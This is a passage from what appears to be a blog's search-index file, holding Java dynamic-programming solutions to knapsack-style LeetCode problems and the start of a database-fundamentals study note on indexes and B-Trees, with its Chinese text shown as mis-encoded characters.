class="type">int</span>  c=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(k[i]-c&gt;<span class="number">0</span>)&#123;<span class="comment">//c=1,2,4,8...èŠ‚çœç©ºé—´</span></span><br><span class="line">                k[i]-=c;</span><br><span class="line">                E e=<span class="keyword">new</span> <span class="title class_">E</span>(c*p[i],c*h[i]);</span><br><span class="line">                lis.add(++index,e);</span><br><span class="line">                c*=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            E e=<span class="keyword">new</span> <span class="title class_">E</span>(k[i]*p[i],k[i]*h[i]);</span><br><span class="line">            lis.add(++index,e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[m+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m; j &gt;=lis.get(i).h ; j--) &#123;</span><br><span class="line">                dp[j]=Math.max(dp[j],dp[j-lis.get(i).h]+lis.get(i).v);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2><span id="494-target-sum">494. Target Sum</span></h2><p>You are given a list of non-negative integers, a1, a2, â€¦, an, and a target, S. Now you have 2 symbols <code>+</code> and <code>-</code>. For each integer, you should choose one from <code>+</code> and <code>-</code> as its new symbol.</p><p>Find out how many ways to assign symbols to make sum of integers equal to target S.</p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Input: nums is [1, 1, 1, 1, 1], S is 3. </span><br><span class="line">Output: 5</span><br><span class="line">Explanation: </span><br><span class="line"></span><br><span class="line">-1+1+1+1+1 = 3</span><br><span class="line">+1-1+1+1+1 = 3</span><br><span class="line">+1+1-1+1+1 = 3</span><br><span class="line">+1+1+1-1+1 = 3</span><br><span class="line">+1+1+1+1-1 = 3</span><br><span class="line"></span><br><span class="line">There are 5 ways to assign symbols to make the sum of nums be target 3.</span><br></pre></td></tr></table></figure><p>è¿™ç§é¢˜å…¶å®æ¢æˆæ­£æ•°é›†åˆå’Œè´Ÿæ•°é›†åˆå°±è¡Œäº†ã€‚å¦‚ä¸Šé¢çš„ä¾‹å­æ­£æ•°+è´Ÿæ•°&#x3D;3 æ­£æ•°-è´Ÿæ•°&#x3D;5ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ±‚å‡ºéœ€è¦å‡‘çš„æ­£æ•°çš„å€¼æ˜¯å¤šå°‘ï¼Œä»è€Œå¯ä»¥å‡‘å‡ºæ¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">findTargetSumWays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> S)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i:nums) cnt+=i;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> (cnt+S)/<span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">neg</span> <span class="operator">=</span> (cnt-S)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(cnt&lt;S||(cnt+S)%<span class="number">2</span>!=<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[pos+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i:nums)&#123;      </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> pos; j &gt;=i ; j--) &#123;</span><br><span class="line">            dp[j]+=dp[j-i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[pos];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="377-combination-sum-iv">377. Combination Sum IV</span></h2><p>Given an integer array with all positive numbers and no duplicates, find the number of possible combinations that add up to a positive integer target.</p><p><strong>Example:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nums = [1, 2, 3]</span><br><span class="line">target = 4</span><br><span class="line"></span><br><span class="line">The possible combination ways are:</span><br><span class="line">(1, 1, 1, 1)</span><br><span class="line">(1, 1, 2)</span><br><span class="line">(1, 2, 1)</span><br><span class="line">(1, 3)</span><br><span class="line">(2, 1, 1)</span><br><span class="line">(2, 2)</span><br><span class="line">(3, 1)</span><br><span class="line"></span><br><span class="line">Note that different sequences are counted as different combinations.</span><br><span class="line"></span><br><span class="line">Therefore the output is 7.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">combinationSum4</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[target + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= target; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> n : nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= n) &#123;</span><br><span class="line">                dp[i] += dp[i - n];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[target];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºcoinsä¸€ä¸ªæ˜¯å¯ä»¥å¾ªç¯ä¸€ä¸ªä¸èƒ½ã€‚</p><p>å…¶å®çœ‹èµ·æ¥ä¸€æ ·ï¼Œä½†æ˜¯ä¸€ä¸ªæ˜¯æ’åˆ—ä¸€ä¸ªæ˜¯ç»„åˆã€‚</p><p>ä¸»è¦è¿˜æ˜¯å®šä¹‰ä¸ä¸€æ ·</p><p>ä¸€ä¸ªæ˜¯ç”¨å®šä¹‰dp[i][j]è¡¨ç¤ºå‰iä¸ªç¡¬å¸åœ¨å‰©ä½™ä»·å€¼ä¸ºjçš„æ—¶å€™çš„èƒ½å‡‘æˆçš„æ–¹æ³•æ•°ã€‚ï¼ˆç”±äºæ˜¯æŒ‰ç¡¬å¸ä¸ºé¡ºåºçš„ï¼ˆç¡¬å¸åªèµ°ä¸€æ¬¡å¾ªç¯ï¼‰å› æ­¤3åªèƒ½ä¸º1+2è€Œä¸èƒ½ä¸º2+1ï¼‰</p><p>ä¸€ä¸ªæ˜¯ç”¨å®šä¹‰dp[i][j]è¡¨ç¤ºåœ¨å‰©ä½™iä»·å€¼ç”¨ç¡¬å¸jçš„æ—¶å€™çš„èƒ½å‡‘æˆçš„æ–¹æ³•æ•°ã€‚ï¼ˆä¸ç®¡ä½ 3æ˜¯1å’Œ2å‡‘çš„è¿˜æ˜¯2å’Œ1å‡‘çš„&#x3D;&gt;3ç­‰äº1+2å’Œ2+1ï¼‰</p><h2><span id="æ€»ç»“">æ€»ç»“</span></h2><p>å¦‚æœä¸æƒ³çœ‹é‚£ä¹ˆå¤šå°±è®°ä½ç»“è®ºï¼š</p><p>é’ˆå¯¹ä¸€ç»´DPï¼Œå¦‚æœå…ƒç´ åªèƒ½å‡ºç°ä¸€æ¬¡ï¼Œå€’åºæ¥åšï¼Œå¦‚æœå¯ä»¥å¤šæ¬¡æ­£åºæ¥åšã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ¨æ€è§„åˆ’ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®åº“åŸºç¡€çŸ¥è¯†ç‚¹</title>
      <link href="/2020/03/23/database/"/>
      <url>/2020/03/23/database/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ç›˜ç‚¹äº†å¸¸è€ƒçš„æ•°æ®åº“åŸºç¡€çŸ¥è¯†ç‚¹</p><span id="more"></span><!-- toc --><ul><li><a href="#%E8%80%83%E7%82%B9">è€ƒç‚¹ï¼š</a></li><li><a href="#%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93">å¦‚ä½•è®¾è®¡ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ âˆš</a><ul><li><a href="#rdbms%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F">RDBMSï¼šå…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ</a></li><li><a href="#%E4%B8%A4%E5%A4%A7%E9%83%A8%E5%88%86">ä¸¤å¤§éƒ¨åˆ†ï¼š</a></li></ul></li><li><a href="#%E7%B4%A2%E5%BC%95%E6%A8%A1%E5%9D%97">ç´¢å¼•æ¨¡å—</a><ul><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95">ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ç´¢å¼• âˆš</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E4%BF%A1%E6%81%AF%E8%83%BD%E6%88%90%E4%B8%BA%E7%B4%A2%E5%BC%95">ä»€ä¹ˆæ ·çš„ä¿¡æ¯èƒ½æˆä¸ºç´¢å¼• âˆš</a></li><li><a href="#%E7%B4%A2%E5%BC%95%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">ç´¢å¼•çš„æ•°æ®ç»“æ„ âˆš</a><ul><li><a href="#b-tree-">B-Tree -</a><ul><li><a href="#%E5%AE%9A%E4%B9%89">å®šä¹‰</a></li></ul></li><li><a href="#b%E6%A0%91%E6%98%AFb%E6%A0%91%E7%9A%84%E5%8F%98%E4%BD%93%E5%85%B6%E5%AE%9A%E4%B9%89%E4%B8%8Eb%E6%A0%91%E7%9B%B8%E5%90%8C%E9%99%A4%E4%BA%86">B+æ ‘æ˜¯Bæ ‘çš„å˜ä½“ï¼Œå…¶å®šä¹‰ä¸Bæ ‘ç›¸åŒï¼Œé™¤äº†</a></li><li><a href="#%E7%BB%93%E8%AE%BA">ç»“è®º âˆš</a></li><li><a href="#%E6%8B%93%E5%B1%95%E9%98%85%E8%AF%BB">æ‹“å±•é˜…è¯»</a></li><li><a href="#hash%E7%B4%A2%E5%BC%95">Hashç´¢å¼•</a><ul><li><a href="#%E7%BC%BA%E7%82%B9">ç¼ºç‚¹ï¼š</a></li></ul></li><li><a href="#bitmap">Bitmap âˆš</a></li></ul></li><li><a href="#%E5%AF%86%E9%9B%86%E7%B4%A2%E5%BC%95%E5%92%8C%E7%A8%80%E7%96%8F%E7%B4%A2%E5%BC%95">å¯†é›†ç´¢å¼•å’Œç¨€ç–ç´¢å¼• âˆš</a></li><li><a href="#innodb">InnoDB</a><ul><li><a href="#%E4%B8%BB%E9%94%AE%E7%B4%A2%E5%BC%95%E5%92%8C%E9%9D%9E%E4%B8%BB%E9%94%AE%E7%B4%A2%E5%BC%95-">ä¸»é”®ç´¢å¼•å’Œéä¸»é”®ç´¢å¼• -</a></li><li><a href="#%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95%E5%92%8C%E9%9D%9E%E8%81%9A%E7%B0%87%E7%B4%A2%E5%BC%95">èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•</a></li></ul></li></ul></li><li><a href="#%E5%A6%82%E4%BD%95%E5%AE%9A%E4%BD%8D%E5%B9%B6%E4%BC%98%E5%8C%96%E6%85%A2%E6%9F%A5%E8%AF%A2sql">å¦‚ä½•å®šä½å¹¶ä¼˜åŒ–æ…¢æŸ¥è¯¢Sql âˆš</a></li><li><a href="#%E6%A0%B9%E6%8D%AE%E6%85%A2%E6%97%A5%E5%BF%97%E5%AE%9A%E4%BD%8D%E6%85%A2%E6%9F%A5%E8%AF%A2sql">æ ¹æ®æ…¢æ—¥å¿—å®šä½æ…¢æŸ¥è¯¢Sql</a><ul><li><a href="#%E6%98%BE%E7%A4%BA%E6%85%A2%E6%9F%A5%E8%AF%A2%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF">æ˜¾ç¤ºæ…¢æŸ¥è¯¢é…ç½®ä¿¡æ¯</a></li><li><a href="#%E6%98%BE%E7%A4%BA%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%95%B0%E9%87%8F">æ˜¾ç¤ºæ…¢æŸ¥è¯¢æ•°é‡</a></li><li><a href="#%E6%89%93%E5%BC%80%E6%85%A2%E6%97%A5%E5%BF%97">æ‰“å¼€æ…¢æ—¥å¿—</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%97%B6%E9%97%B4%E9%98%88%E5%80%BC">è®¾ç½®æ…¢æŸ¥è¯¢æ—¶é—´é˜ˆå€¼</a></li></ul><ul><li><a href="#%E5%88%A9%E7%94%A8explain%E5%88%86%E6%9E%90sql">åˆ©ç”¨Explainåˆ†æsql</a><ul><li><a href="#type%E4%BB%8E%E6%9C%80%E4%BC%98%E5%88%B0%E6%9C%80%E5%B7%AE">Typeä»æœ€ä¼˜åˆ°æœ€å·®</a></li><li><a href="#extra">Extra</a></li></ul></li><li><a href="#%E4%BF%AE%E6%94%B9sql%E5%B0%BD%E9%87%8F%E8%AE%A9sql%E8%B5%B0%E7%B4%A2%E5%BC%95">ä¿®æ”¹sqlå°½é‡è®©sqlèµ°ç´¢å¼•</a><ul><li><a href="#%E8%B5%B0%E7%B4%A2%E5%BC%95">èµ°ç´¢å¼•</a></li><li><a href="#%E5%8A%A0%E7%B4%A2%E5%BC%95">åŠ ç´¢å¼•</a></li></ul></li></ul></li><li><a href="#%E8%81%94%E5%90%88%E7%B4%A2%E5%BC%95%E6%9C%80%E5%B7%A6%E5%8C%B9%E9%85%8D%E5%8E%9F%E5%88%99">è”åˆç´¢å¼•æœ€å·¦åŒ¹é…åŸåˆ™ âˆš</a><ul><li><a href="#%E6%88%90%E5%9B%A0%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E6%AE%B5%E6%98%AF%E7%BB%9D%E5%AF%B9%E6%9C%89%E5%BA%8F%E7%9A%84%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%AD%97%E6%AE%B5%E6%98%AF%E6%97%A0%E5%BA%8F%E7%9A%84">æˆå› ï¼šç¬¬ä¸€ä¸ªå­—æ®µæ˜¯ç»å¯¹æœ‰åºçš„ï¼Œç¬¬äºŒä¸ªå­—æ®µæ˜¯æ— åºçš„ã€‚</a></li></ul></li><li><a href="#%E7%B4%A2%E5%BC%95%E6%98%AF%E8%B6%8A%E5%A4%9A%E8%B6%8A%E5%A5%BD%E4%B9%88">ç´¢å¼•æ˜¯è¶Šå¤šè¶Šå¥½ä¹ˆ âˆš</a></li><li><a href="#%E9%94%81%E6%A8%A1%E5%9D%97">é”æ¨¡å—</a><ul><li><a href="#%E4%BA%8C%E6%AE%B5%E9%94%81">äºŒæ®µé”</a></li><li><a href="#myisam%E4%B8%8Einnodb%E5%85%B3%E4%BA%8E%E9%94%81%E6%96%B9%E9%9D%A2%E7%9A%84%E5%8C%BA%E5%88%AB">MyISAMä¸InnoDBå…³äºé”æ–¹é¢çš„åŒºåˆ«</a><ul><li><a href="#myisam%E9%80%82%E5%90%88%E7%9A%84%E5%9C%BA%E6%99%AF">MyISAMé€‚åˆçš„åœºæ™¯ âˆš</a></li><li><a href="#innodb%E9%80%82%E7%94%A8%E7%9A%84%E5%9C%BA%E6%99%AF">InnoDBé€‚ç”¨çš„åœºæ™¯ âˆš</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%94%81%E7%9A%84%E5%88%86%E7%B1%BB-">æ•°æ®åº“é”çš„åˆ†ç±»ï¼š-</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%8B%E5%8A%A1%E7%9A%84%E5%9B%9B%E5%A4%A7%E7%89%B9%E6%80%A7">æ•°æ®åº“äº‹åŠ¡çš„å››å¤§ç‰¹æ€§</a></li><li><a href="#%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%E4%BB%A5%E5%8F%8A%E5%90%84%E7%BA%A7%E5%88%AB%E4%B8%8B%E5%B9%B6%E5%8F%91%E8%AE%BF%E9%97%AE%E9%97%AE%E9%A2%98">äº‹åŠ¡éš”ç¦»çº§åˆ«ä»¥åŠå„çº§åˆ«ä¸‹å¹¶å‘è®¿é—®é—®é¢˜</a><ul><li><a href="#1-%E6%9B%B4%E6%96%B0%E4%B8%A2%E5%A4%B1">1. æ›´æ–°ä¸¢å¤±</a></li><li><a href="#2-%E8%84%8F%E8%AF%BB%E8%AF%BB%E5%8F%96%E6%9C%AA%E6%8F%90%E4%BA%A4%E6%95%B0%E6%8D%AE">2. è„è¯»ï¼ˆè¯»å–æœªæäº¤æ•°æ®ï¼‰</a></li><li><a href="#3-%E4%B8%8D%E5%8F%AF%E9%87%8D%E5%A4%8D%E8%AF%BB%E4%B8%80%E4%B8%AA%E4%BA%8B%E5%8A%A1%E8%8C%83%E5%9B%B4%E5%86%85%E4%B8%A4%E4%B8%AA%E7%9B%B8%E5%90%8C%E7%9A%84%E6%9F%A5%E8%AF%A2%E5%8D%B4%E8%BF%94%E5%9B%9E%E4%BA%86%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE">3. ä¸å¯é‡å¤è¯»ï¼ˆä¸€ä¸ªäº‹åŠ¡èŒƒå›´å†…ä¸¤ä¸ªç›¸åŒçš„æŸ¥è¯¢å´è¿”å›äº†ä¸åŒæ•°æ®ï¼‰</a><ul><li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95">è§£å†³æ–¹æ³•ï¼š</a></li></ul></li><li><a href="#4-%E5%B9%BB%E8%AF%BB%E5%89%8D%E5%90%8E%E5%A4%9A%E6%AC%A1%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E6%80%BB%E9%87%8F%E4%B8%8D%E4%B8%80%E8%87%B4">4. å¹»è¯»ï¼šï¼ˆå‰åå¤šæ¬¡è¯»å–ï¼Œæ•°æ®æ€»é‡ä¸ä¸€è‡´ï¼‰</a></li></ul></li><li><a href="#innodb%E5%8F%AF%E9%87%8D%E5%A4%8D%E8%AF%BB%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%E4%B8%8B%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E5%B9%BB%E8%AF%BB">InnoDBå¯é‡å¤è¯»éš”ç¦»çº§åˆ«ä¸‹å¦‚ä½•é¿å…å¹»è¯»</a><ul><li><a href="#%E5%BD%93%E5%89%8D%E8%AF%BB">å½“å‰è¯»</a></li><li><a href="#%E5%BF%AB%E7%85%A7%E8%AF%BB">å¿«ç…§è¯»</a><ul><li><a href="#rc%E7%BA%A7%E5%88%AB%E4%B8%8B">RCçº§åˆ«ä¸‹</a></li><li><a href="#%E5%9C%A8rr%E7%BA%A7%E5%88%AB%E4%B8%8B">åœ¨RRçº§åˆ«ä¸‹</a></li></ul></li><li><a href="#gap%E9%94%81">Gapé”</a><ul><li><a href="#1-%E4%B8%BB%E9%94%AE%E6%88%96%E8%80%85%E5%94%AF%E4%B8%80%E9%94%AE">1. ä¸»é”®æˆ–è€…å”¯ä¸€é”®</a><ul><li><a href="#%E5%85%A8%E9%83%A8%E5%91%BD%E4%B8%AD">å…¨éƒ¨å‘½ä¸­</a></li><li><a href="#%E5%85%A8%E4%B8%8D%E5%91%BD%E4%B8%AD">å…¨ä¸å‘½ä¸­</a></li><li><a href="#%E9%83%A8%E5%88%86%E5%91%BD%E4%B8%AD">éƒ¨åˆ†å‘½ä¸­</a></li><li><a href="#%E5%A6%82%E6%9E%9C%E5%85%A8%E5%91%BD%E4%B8%AD">å¦‚æœå…¨å‘½ä¸­</a></li></ul></li><li><a href="#%E9%9D%9E%E5%94%AF%E4%B8%80%E7%B4%A2%E5%BC%95%E5%92%8C%E4%B8%8D%E8%B5%B0%E7%B4%A2%E5%BC%95%E7%9A%84%E5%BD%93%E5%89%8D%E8%AF%BB%E4%B8%8B">éå”¯ä¸€ç´¢å¼•å’Œä¸èµ°ç´¢å¼•çš„å½“å‰è¯»ä¸‹</a><ul><li><a href="#%E9%9D%9E%E5%94%AF%E4%B8%80%E7%B4%A2%E5%BC%95">éå”¯ä¸€ç´¢å¼•</a></li><li><a href="#%E4%B8%8D%E8%B5%B0%E7%B4%A2%E5%BC%95">ä¸èµ°ç´¢å¼•</a></li></ul></li></ul></li></ul></li><li><a href="#rc-rr%E7%BA%A7%E5%88%AB%E4%B8%8B%E7%9A%84innodb%E7%9A%84%E9%9D%9E%E9%98%BB%E5%A1%9E%E8%AF%BB%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0">RCã€RRçº§åˆ«ä¸‹çš„InnoDBçš„éé˜»å¡è¯»å¦‚ä½•å®ç°</a></li></ul></li><li><a href="#%E5%85%B3%E9%94%AE%E8%AF%AD%E6%B3%95">å…³é”®è¯­æ³•</a><ul><li><a href="#group-by">GROUP BY</a></li><li><a href="#having">HAVING</a></li><li><a href="#countsummaxminavg">COUNT,SUM,MAX,MIN,AVG</a></li></ul></li><li><a href="#%E7%90%86%E8%AE%BA%E8%8C%83%E5%BC%8F">ç†è®ºèŒƒå¼</a><ul><li><a href="#1nf">1NF</a></li><li><a href="#2nf">2NF</a></li><li><a href="#3nf">3NF</a></li><li><a href="#%E5%85%B6%E5%AE%83%E8%8C%83%E5%BC%8F">å…¶å®ƒèŒƒå¼</a></li><li><a href="#%E4%BC%98%E7%BC%BA%E7%82%B9">ä¼˜ç¼ºç‚¹</a></li></ul></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5">æ•°æ®åº“è¿æ¥</a></li></ul><!-- tocstop --><h2><span id="è€ƒç‚¹">è€ƒç‚¹ï¼š</span></h2><p>æ¶æ„ï¼Œç´¢å¼•ï¼Œé”ï¼Œè¯­æ³•ï¼Œç†è®ºèŒƒå¼</p><h2><span id="å¦‚ä½•è®¾è®¡ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“">å¦‚ä½•è®¾è®¡ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ âˆš</span></h2><h3><span id="rdbmså…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ">RDBMSï¼šå…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ</span></h3><p><img src="/2020/03/23/database/clip_image002.jpg"></p><h3><span id="ä¸¤å¤§éƒ¨åˆ†">ä¸¤å¤§éƒ¨åˆ†ï¼š</span></h3><p>â€‹<strong>å­˜å‚¨éƒ¨åˆ†</strong>å’Œ<strong>ç¨‹åºéƒ¨åˆ†</strong></p><h2><span id="ç´¢å¼•æ¨¡å—">ç´¢å¼•æ¨¡å—</span></h2><h3><span id="ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ç´¢å¼•">ä¸ºä»€ä¹ˆè¦ä½¿ç”¨ç´¢å¼• âˆš</span></h3><p>â€‹é¿å…å…¨è¡¨æ‰«æå»æŸ¥æ‰¾æ•°æ®ï¼Œæå‡æ£€ç´¢æ•ˆç‡</p><h3><span id="ä»€ä¹ˆæ ·çš„ä¿¡æ¯èƒ½æˆä¸ºç´¢å¼•">ä»€ä¹ˆæ ·çš„ä¿¡æ¯èƒ½æˆä¸ºç´¢å¼• âˆš</span></h3><p>â€‹ä¸»é”®ï¼Œå”¯ä¸€é”®ç­‰èƒ½è®©æ•°æ®<font color="red">å…·å¤‡ä¸€å®šåŒºåˆ†æ€§çš„å­—æ®µ</font></p><h3><span id="ç´¢å¼•çš„æ•°æ®ç»“æ„">ç´¢å¼•çš„æ•°æ®ç»“æ„ âˆš</span></h3><p>â€‹äºŒå‰æŸ¥æ‰¾æ ‘ï¼ŒB-Treeï¼ŒB+Treeï¼ˆMySqlï¼‰ï¼ŒHashç»“æ„</p><h4><span id="b-tree-">B-Tree -</span></h4><p>å³éè§‚æ•´æ£µæ ‘ï¼Œå­èŠ‚ç‚¹æœ€å¤šçš„ä¸ªæ•°æ˜¯mï¼Œé‚£ä¹ˆè¿™æ£µæ ‘å°±æ˜¯mé˜¶æ ‘ã€‚</p><p><img src="/2020/03/23/database/clip_image002-1584950180040.jpg"></p><h5><span id="å®šä¹‰">å®šä¹‰</span></h5><ul><li><p>æ ¹èŠ‚ç‚¹è‡³å°‘åŒ…æ‹¬ä¸¤ä¸ªå­©å­</p></li><li><p>æ ‘ä¸­æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šå«æœ‰mä¸ªå­©å­ï¼ˆm&gt;&#x3D;2ï¼‰</p></li><li><p>é™¤æ ¹èŠ‚ç‚¹å’Œå¶èŠ‚ç‚¹å¤–ï¼Œå…¶ä»–æ¯ä¸ªèŠ‚ç‚¹è‡³å°‘æœ‰ceil(m&#x2F;2)ä¸ªå­©å­</p></li><li><p>æ‰€æœ‰å¶å­èŠ‚ç‚¹éƒ½ä½äºåŒä¸€å±‚</p></li></ul><p>å‡è®¾æ¯ä¸ªéç»ˆç«¯ç»“ç‚¹ä¸­åŒ…å«nä¸ªå…³é”®å­—ä¿¡æ¯ï¼Œå…¶ä¸­</p><p>Aï¼‰ Kiï¼ˆi&#x3D;1â€¦nï¼‰ä¸ºå…³é”®å­—ï¼Œä¸”å…³é”®å­—æŒ‰é¡ºåºå‡åºæ’åºK(i-1)&lt;Ki</p><p>Bï¼‰ å…³é”®å­—çš„ä¸ªæ•°nå¿…é¡»æ»¡è¶³ï¼š[ceil(m&#x2F;2)-1]&lt;&#x3D;n&lt;&#x3D;m-1</p><p>Cï¼‰ éå¶å­ç»“ç‚¹çš„æŒ‡é’ˆï¼šP[1]ï¼ŒP[2]ï¼Œâ€¦ï¼ŒP[M]ï¼›å…¶ä¸­P[1]æŒ‡å‘å…³é”®å­—å°äºK[1]çš„å­æ ‘ï¼ŒP[M]æŒ‡å‘å…³é”®å­—å¤§äºK[M-1]çš„å­æ ‘ï¼Œå…¶å®ƒP[i]æŒ‡å‘å…³é”®å­—å±äºï¼ˆK[i-1],K[i]ï¼‰çš„å­æ ‘ </p><h4><span id="bæ ‘æ˜¯bæ ‘çš„å˜ä½“å…¶å®šä¹‰ä¸bæ ‘ç›¸åŒé™¤äº†">B+æ ‘æ˜¯Bæ ‘çš„å˜ä½“ï¼Œå…¶å®šä¹‰ä¸Bæ ‘ç›¸åŒï¼Œé™¤äº†</span></h4><ul><li><p>éå¶å­èŠ‚ç‚¹çš„å­æ ‘æŒ‡é’ˆä¸å…³é”®å­—ä¸ªæ•°ç›¸åŒ</p></li><li><p>éå¶å­èŠ‚ç‚¹çš„å­æ ‘æŒ‡é’ˆP[i]ï¼ŒæŒ‡å‘å…³é”®å­—å€¼[K[i],K[i+1])çš„å­æ ‘</p></li><li><p>éå¶å­èŠ‚ç‚¹ä»…ç”¨æ¥ç´¢å¼•ï¼Œæ•°æ®éƒ½ä¿å­˜åœ¨å¶å­èŠ‚ç‚¹ä¸­</p></li><li><p>æ‰€æœ‰å¶å­èŠ‚ç‚¹å‡æœ‰ä¸€ä¸ªé“¾æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå¶å­èŠ‚ç‚¹</p></li></ul><h4><span id="ç»“è®º">ç»“è®º 